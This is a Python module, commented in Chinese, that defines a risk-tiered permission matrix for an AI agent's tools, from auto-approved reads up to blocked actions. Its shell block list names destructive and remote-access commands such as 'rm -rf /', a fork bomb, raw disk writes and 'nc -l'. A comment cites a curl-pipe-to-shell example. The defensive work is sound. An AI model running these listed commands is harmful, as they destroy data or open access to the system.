"""权限矩阵定义 —— RiskLevel, ToolPermission, DEFAULT_PERMISSIONS.

四层风险等级：
- AUTO(0):     自动批准 —— 读文件、读环境变量、ls
- CONFIRM(1):  用户确认 —— 写文件、删除、重命名
- REVIEW(2):   Guardian审查 —— shell命令、进程操作、HTTP请求
- BLOCK(3):    阻断 —— rm -rf /、sudo、curl-pipe-shell、self_modify
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any

# ── 风险等级枚举 ──────────────────────────────────────────────
class RiskLevel(Enum):
    AUTO = 0        # 自动批准：读文件、读环境变量、ls
    CONFIRM = 1     # 用户确认：写文件、删除、重命名
    REVIEW = 2      # Guardian审查：shell命令、进程操作
    BLOCK = 3       # 阻断：rm -rf /、sudo、curl-pipe-shell

# ── 工具权限数据类 ────────────────────────────────────────────
@dataclass
class ToolPermission:
    """单个工具在权限矩阵中的定义。

    Attributes:
        tool_name: 工具名称（如 shell_command, write_file）
        risk_level: 默认风险等级
        arg_rules:   按参数名细分的权限规则。
                     格式 {arg_name: {pattern_value: RiskLevel}}，
                     例如 {"command": {"rm -rf*": RiskLevel.BLOCK}}
                     匹配语义：pattern 以 '*' 结尾 = 前缀匹配；否则 = 子串匹配。
                     （`rm -rf /*` 因此同时覆盖 `rm -rf /` 与 `rm -rf /tmp/x`。）
    """
    tool_name: str
    risk_level: RiskLevel
    arg_rules: dict[str, dict[str, RiskLevel]] | None = field(default=None)

    def resolve_risk(self, tool_args: dict[str, Any] | None = None) -> RiskLevel:
        """根据参数规则解析实际风险等级。

        先检查 arg_rules 中的细粒度规则（按参数名→模式匹配），
        若无匹配则返回默认 risk_level。

        Args:
            tool_args: 工具调用参数

        Returns:
            解析后的 RiskLevel
        """
        if not self.arg_rules or not tool_args:
            return self.risk_level
        for arg_name, patterns in self.arg_rules.items():
            arg_value = tool_args.get(arg_name, "")
            if isinstance(arg_value, str):
                for pattern, level in patterns.items():
                    # 通配符模式：结尾带 * 表示前缀匹配
                    if pattern.endswith("*"):
                        if arg_value.startswith(pattern[:-1]):
                            return level
                    elif pattern in arg_value:
                        return level
        return self.risk_level

# ── 默认权限矩阵 ──────────────────────────────────────────────
DEFAULT_PERMISSIONS: dict[str, ToolPermission] = {
    # AUTO: 只读操作，无副作用
    "read_file": ToolPermission("read_file", RiskLevel.AUTO),
    "list_directory": ToolPermission("list_directory", RiskLevel.AUTO),
    "get_env": ToolPermission("get_env", RiskLevel.AUTO),

    # CONFIRM: 有副作用但可逆/局部
    "write_file": ToolPermission("write_file", RiskLevel.CONFIRM),
    "delete_file": ToolPermission("delete_file", RiskLevel.CONFIRM),
    "rename_file": ToolPermission("rename_file", RiskLevel.CONFIRM),

    # REVIEW: 需要 Guardian 评估（shell、网络、进程操作）
    "shell_command": ToolPermission(
        "shell_command", RiskLevel.REVIEW,
        arg_rules={
            "command": {
                "rm -rf /": RiskLevel.BLOCK,
                "rm -rf /*": RiskLevel.BLOCK,
                "sudo ": RiskLevel.BLOCK,
                # cycle-29 A (D-G3 residual): "curl |" / "wget |" used to live
                # here and could never fire -- a real download pipeline is
                # "curl http://x | sh", which does not *contain* "curl |".
                # The obvious repair is unsafe in a substring engine: a literal
                # like "| sh" also matches benign suffixes ("... | shasum",
                # "... | shuf"), i.e. it would deny ln -s work.  Pipe-into-shell
                # is a *regex* shape and is owned by
                # risk_assessor._HIGH_RISK_PATTERNS ("curl/wget piped to shell"
                # -> 1.0 escalate -> deny).  Removed so the BLOCK tier stops
                # shipping a rule with no witness command; guarded by
                # tests/test_guardian_gate.py::test_every_shell_arg_rule_literal_is_reachable.
                "chmod 777": RiskLevel.BLOCK,
                "> /dev/sd": RiskLevel.BLOCK,
                "nc -l": RiskLevel.BLOCK,
                "dd if=": RiskLevel.REVIEW,
                ":(){": RiskLevel.BLOCK,    # fork bomb
            },
        },
    ),
    "http_request": ToolPermission(
        "http_request", RiskLevel.REVIEW,
        arg_rules={
            "url": {
                "http://localhost": RiskLevel.AUTO,
                "https://localhost": RiskLevel.AUTO,
                "http://127.0.0.1": RiskLevel.AUTO,
                "https://127.0.0.1": RiskLevel.AUTO,
            },
        },
    ),
    "process_manage": ToolPermission("process_manage", RiskLevel.REVIEW),

    # BLOCK: 始终阻断
    "self_modify": ToolPermission("self_modify", RiskLevel.BLOCK),
    "execute_code": ToolPermission("execute_code", RiskLevel.REVIEW),
}

def get_permission(tool_name: str) -> ToolPermission | None:
    """查询工具权限配置。

    Args:
        tool_name: 工具名称

    Returns:
        ToolPermission 或 None（未知工具）
    """
    return DEFAULT_PERMISSIONS.get(tool_name)
